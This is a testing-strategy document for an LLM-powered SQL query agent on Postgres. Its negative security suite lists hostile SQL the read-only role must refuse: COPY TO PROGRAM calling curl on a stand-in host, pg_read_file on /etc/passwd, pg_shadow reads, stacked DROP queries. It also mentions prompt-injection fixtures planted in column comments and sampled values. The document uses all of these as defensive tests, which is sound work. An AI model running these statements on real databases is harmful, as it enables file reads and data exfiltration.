# Testing

> **Status: philosophy and the security test suite are decided now** (the negative tests gate Stage 1). Coverage numbers and load results are **TBD — Stage 6**.

---

## 1. Philosophy

Three claims this project makes, in descending order of how badly a false claim would reflect:

1. **The blast radius is bounded.** ← must be *proven*, not asserted
2. Validation catches invalid SQL before execution.
3. The agent recovers from errors.

Testing effort follows that ordering. Claim 1 gets **negative tests that must fail** — the read-only role must be *unable* to write. A green test suite that never tried to write proves nothing.

**Non-determinism is handled by testing the harness, not the model.** LLM output cannot be asserted on directly. So: the agent's *plumbing* (does an error reach the retry loop? is the retry budget enforced? is the row limit clamped?) is tested deterministically with a fake LLM, and model *quality* is measured by the eval harness in [../ml/EVALUATION.md](../ml/EVALUATION.md). Conflating the two produces a flaky test suite and an unmeasured model.

## 2. Test pyramid

| Layer | Count | Speed | Dependencies |
|---|---|---|---|
| Unit | Most | ms | None — fakes throughout |
| Integration | Some | seconds | Real Postgres via testcontainers |
| **Security (negative)** | **Small, non-negotiable** | seconds | Real Postgres |
| Contract (MCP) | Small | seconds | Real MCP servers |
| End-to-end | Few | tens of seconds | Everything, fake LLM |
| Load | Few | minutes | Everything |
| Eval | Separate | many minutes | Everything, **real LLM** |

Eval is deliberately outside the test suite — it costs money, it is non-deterministic, and it produces measurements rather than pass/fail. It runs on demand and per release, not per commit.

## 3. Unit tests

Fast, isolated, no I/O. The bulk of the suite.

High-value targets:

- **sqlglot AST validation** — every rejection path: multiple statements, DML nodes, DDL nodes, unknown identifiers, `SELECT` nested inside a CTE that is not read-only.
- **Row-limit injection** — no existing `LIMIT`; larger existing `LIMIT`; smaller existing `LIMIT` (the smaller must win); `LIMIT` inside a subquery.
- **Error classification** — each database error maps to the right `error_type`, since the retry prompt branches on it.
- **Retry budget** — exhaustion raises rather than looping.
- **Settings validation** — out-of-range values fail at startup, client values clamp to ceilings.
- **Prompt assembly** — stable prefix is byte-identical across requests (the prompt-cache precondition).
- **Profiling bounds** — identifier resolution happens *before* any statement is composed (asserted with a connection that raises on any access, so the ordering is tested rather than the outcome); type eligibility for extremes; sample-size clamping.

The LLM is a fake that returns scripted responses, so retry, decomposition, and self-correction logic is fully testable without a live model.

## 4. Integration tests

Real PostgreSQL via `testcontainers`, with pgvector.

**Not SQLite, not a mock.** The security model *is* Postgres role enforcement; testing it against anything else tests nothing. The container is created per session, and per-test isolation comes from transaction rollback.

Covers: migrations up and down; role and grant creation; vector round-trip and ANN retrieval; statement timeout actually firing; connection pool exhaustion behaviour; audit-log writes; and profiling behaviour that has no useful fake — what `count(DISTINCT)` does to a `json` column, what `reltuples` reports before an `ANALYZE`, and whether a statement composed from a catalog name actually runs.

## 5. Security tests — the ones that must fail

**These gate every release.** Each asserts the read-only role is *denied*. A test here that passes when it should fail means the containment story is broken.

```python
@pytest.mark.parametrize(
    "statement",
    [
        "INSERT INTO orders (id) VALUES (1)",
        "UPDATE orders SET total_amount = 0",
        "DELETE FROM orders",
        "TRUNCATE orders",
        "CREATE TABLE evil (id int)",
        "DROP TABLE orders",
        "ALTER TABLE orders ADD COLUMN x int",
        "CREATE INDEX ON orders (id)",
        "COPY orders TO PROGRAM 'curl evil.example'",
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_ls_dir('/')",
        "SELECT * FROM agent_meta.query_audit",
        "SELECT * FROM agent_meta.sessions",
        "SELECT * FROM pg_shadow",
    ],
)
def test_readonly_role_is_denied(ro_connection, statement):
    with pytest.raises(psycopg.errors.InsufficientPrivilege):
        ro_connection.execute(statement)
```

The two easiest to omit and most damaging to miss:

- **`pg_read_file` / `COPY ... TO PROGRAM`** — without `EXECUTE` revoked on functions, a `SELECT`-only role can read files off the database host. Blocking DML while leaving these reachable is not a read-only role.
- **`agent_meta` reads** — generated SQL must not be able to read the audit log, session history, or embeddings.

Additional cases:
- Every AST rejection path is re-tested end-to-end through `execute_sql` — it must reject independently, not rely on the caller having validated first.
- Stacked queries (`SELECT 1; DROP TABLE x`).
- Prompt-injection fixtures: sampled values and column comments containing instruction-shaped text. The assertion is not "the model ignored it" (unassertable) but "whatever SQL results is still `SELECT`-only, still row-limited, still runs under the read-only role."

**Disclosure tests** are the other half of the negative suite, and they invert the question: the role tests assert the database *refuses*, these assert the system *withholds*. Two files carry them.

- **What may reach a prompt.** A planted secret in a catalog element's serialized text is absent from the rendered prompt, plus an assertion that the *whole* serialized string is absent — so a value the test never considered is excluded with it — and an allowlist assertion writing out exactly what the model receives, line by line. Deliberately brittle: that assertion *is* the network boundary, and changing what crosses it should require editing a list.
- **What a profile may reveal.** A sensitively-named column yields nothing even with sampling on; a value occurring once is withheld while a common one is not; a caller cannot request raw samples into existence. One test turns sampling *on* and asserts values do appear — without it, every negative test above would also pass if the feature were simply broken.

A third kind appears here and nowhere else: **source-level assertions**. That no identifier is interpolated into SQL, that raw values are read in exactly one function, that the sensitivity check precedes the statistics call. They check the shape of a module rather than its behaviour, which is unusual and deliberate — the property being protected is that someone changing the file can *see* what they are changing.

## 6. Contract tests (MCP)

Against real servers over the real transport.

- `tools/list` returns valid JSON Schema for every tool.
- Every declared input constraint is enforced server-side — `maximum`, `enum`, `required`. **Not just declared: enforced.** A schema constraint the server does not check is documentation, not a limit.
- Errors return `isError: true` with structured content, never a protocol-level exception.
- Malformed arguments produce a clean error, not a crash.
- **Schema snapshot test** — tool schemas are captured and diffed, so a breaking change to a contract fails CI rather than silently shipping. See [../architecture/MCP.md](../architecture/MCP.md) §8.

## 7. End-to-end tests

Full stack, fake LLM with scripted responses. Deterministic.

Scenarios: happy path; validation failure → correction → success; retry budget exhausted; statement timeout; row-limit truncation flagged in the response; multi-step decomposition; MCP server unavailable → documented degradation; client disconnects mid-SSE (no leaked connection or open transaction).

## 8. Load tests

> **TBD — Stage 6.** `locust`. Feeds [../operations/PERFORMANCE.md](../operations/PERFORMANCE.md) §4.

Answering: sustained throughput within p95 target; concurrency at pool saturation; behaviour past saturation (queueing vs collapse); memory per replica; effect of one expensive query on concurrent latency.

**Graceful degradation past saturation is the finding that matters**, more than peak throughput.

## 9. Benchmark tests

`pytest-benchmark` on components with explicit budgets — retrieval < 100 ms, validation < 50 ms.

These are **regression guards, not measurements**: they fail when a component gets meaningfully slower. Reported latency numbers come from the load tests on known hardware, not from a laptop running CI.

## 10. Coverage

Target: **85% on `src/`**, with 100% on validation, limit enforcement, and error classification.

Coverage is a floor, not a goal. The security suite would contribute a handful of percentage points and is worth more than the rest combined — which is the argument against optimizing the number. Uncovered branches are reviewed individually; a line that is genuinely untestable gets `# pragma: no cover` **with a comment saying why**.

## 11. CI

> **TBD — Stage 6.**

| Stage | Runs |
|---|---|
| Lint | `ruff format --check`, `ruff check`, `mypy src` |
| Unit | Full unit suite |
| Integration | testcontainers Postgres |
| **Security** | **The negative suite — a failure blocks merge** |
| Contract | MCP schema snapshots |
| E2E | Fake LLM |
| Smoke eval | ~20 questions, real LLM, **release only** |

## 12. What is not tested

Stated so the gap is deliberate rather than accidental:

- **LLM output quality.** Measured by the eval harness, not asserted in tests.
- **Prompt effectiveness.** Same — a prompt change is validated by an eval run.
- **Third-party library correctness.** sqlglot's parser is trusted; `EXPLAIN` is the second opinion.
- **Postgres itself.** The privilege system is the foundation, not a subject.
